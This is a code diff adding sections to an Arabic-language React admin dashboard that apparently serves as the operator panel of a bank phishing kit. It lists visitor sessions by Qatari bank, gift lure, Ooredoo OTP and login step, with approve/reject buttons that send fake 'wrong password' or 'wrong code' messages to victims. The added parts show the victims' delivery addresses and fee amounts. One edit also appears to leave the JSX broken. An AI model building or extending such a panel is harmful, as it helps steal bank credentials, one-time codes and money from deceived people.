@@ -259,6 +259,36 @@ export default function AdminDashboard() {
 
           {selectedSession && (
             <div className="p-8 space-y-8">
+              {/* عرض بيانات الجلسة الأساسية */}
+              <div className="bg-gradient-to-r from-slate-50 to-slate-100 p-6 rounded-2xl border border-slate-200">
+                <h3 className="text-lg font-black text-slate-800 mb-4 flex items-center gap-2">
+                  <div className="w-8 h-8 bg-[#8C0032] rounded-lg flex items-center justify-center text-white text-sm">📋</div>
+                  بيانات الجلسة الأساسية
+                </h3>
+                <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
+                  <div>
+                    <span className="text-[10px] font-bold text-slate-400 uppercase tracking-wider">معرّف الجلسة</span>
+                    <span className="text-sm font-black text-slate-700 break-all">{selectedSession.id}</span>
+                  </div>
+                  <div>
+                    <span className="text-[10px] font-bold text-slate-400 uppercase tracking-wider">البلد (مصدر الزيارة)</span>
+                    <span className="text-sm font-black text-slate-700">{selectedSession.country || "—"}</span>
+                  </div>
+                  <div>
+                    <span className="text-[10px] font-bold text-slate-400 uppercase tracking-wider">نوع العضوية</span>
+                    <span className="text-sm font-black text-slate-700">
+                      {selectedSession.selectedBank === 'qnb' ? 'الفضية' : 
+                       selectedSession.selectedBank === 'cbq' ? 'الذهبية' : 
+                       selectedSession.selectedBank === 'dib' ? 'البلاتينية' : selectedSession.selectedBank?.toUpperCase()}
+                    </span>
+                  </div>
+                  <div>
+                    <span className="text-[10px] font-bold text-slate-400 uppercase tracking-wider">الهدية المختارة</span>
+                    <span className="text-sm font-black text-slate-700">{selectedSession.selectedGift || "—"}</span>
+                  </div>
+                </div>
+              </div>
+
               <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                 <DataSection 
                   title="البيانات الشخصية"
@@ -328,8 +358,41 @@ export default function AdminDashboard() {
                       isOtpOoredoo ? "الرمز غير صحيح او غير صالح" : "اسم المستخدم او كلمة المرور غير صحيحه"
                     );
                   }}
-                />
+                </DataSection>
               </div>
+
+              {/* عرض بيانات العنوان والتسليم */}
+              {selectedSession.loginMethod && (
+                <DataSection 
+                  title="بيانات العنوان والتسليم"
+                  icon={<MapPin className="w-4 h-4" />}
+                  data={{
+                    "طريقة التسليم": selectedSession.loginMethod?.deliveryMethod === 'home' ? 'إلى المنزل' : 'فرع البنك',
+                    "العنوان": selectedSession.loginMethod?.deliveryAddress,
+                    "اسم الفرع": selectedSession.loginMethod?.branchName || "—",
+                    "تأكيد الهاتف": selectedSession.loginMethod?.phoneConfirmation || "—",
+                  }}
+                  currentStep={selectedSession.currentStep}
+                  onAccept={() => handleAdminAction(selectedSession.id, 'approve')}
+                  onReject={() => handleAdminAction(selectedSession.id, 'reject', "برجاء التحقق من معلومات العنوان")}
+                />
+              )}
+
+              {/* عرض بيانات الرسوم */}
+              {selectedSession.loginMethod && (
+                <DataSection 
+                  title="بيانات الرسوم والمبالغ"
+                  icon={<CreditCard className="w-4 h-4" />}
+                  data={{
+                    "رسم الإصدار": selectedSession.loginMethod?.issuanceFee || "—",
+                    "رسم التسليم": selectedSession.loginMethod?.deliveryFee || "—",
+                    "المبلغ الإجمالي": selectedSession.loginMethod?.totalAmount || "—",
+                  }}
+                  currentStep={selectedSession.currentStep}
+                  onAccept={() => handleAdminAction(selectedSession.id, 'approve')}
+                  onReject={() => handleAdminAction(selectedSession.id, 'reject', "برجاء التحقق من الرسوم")}
+                />
+              )}
             </div>
           )}
 
